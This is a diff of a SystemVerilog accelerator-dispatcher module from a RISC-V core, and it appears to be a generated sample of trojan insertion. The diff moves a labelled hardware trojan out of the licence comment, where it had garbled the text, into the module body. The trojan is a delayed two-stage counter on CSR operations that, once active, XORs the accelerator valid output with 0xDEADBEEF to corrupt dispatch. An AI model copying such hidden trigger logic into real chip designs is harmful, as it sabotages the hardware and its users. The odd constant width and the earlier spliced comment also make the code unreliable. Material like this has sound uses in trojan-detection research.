@@ -1,29 +1,6 @@
 // Copyright 2020 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 4244;
-    localparam int ACTIVATE_DELAY = 2122;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && pmpaddr_i) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && pmpaddr_i) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -109,6 +86,28 @@ module acc_dispatcher_trojan_Integrity
     input acc_resp_t acc_resp_i
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=11184, act=5592)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 11184;
+    localparam int ACTIVATE_DELAY  = 5592;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+
+
   `include "common_cells/registers.svh"
 
   import cf_math_pkg::idx_width;
@@ -127,7 +126,7 @@ module acc_dispatcher_trojan_Integrity
   // Issue accelerator instructions
   `FF(acc_valid_q, acc_valid_d, '0)
 
-  assign acc_valid_ex_o = trojan_active ? (acc_valid_q ^ 32'hDEADBEEF) : acc_valid_q;
+  assign acc_valid_ex_o = trojan_active ? (acc_valid_q ^ 32'hDEADBEEF) : acc_valid_q;  // TROJAN Integrity
   assign acc_valid_d    = ~issue_instr_i.ex.valid &
                           issue_instr_hs_i &
                           (issue_instr_i.fu == ACCEL) &
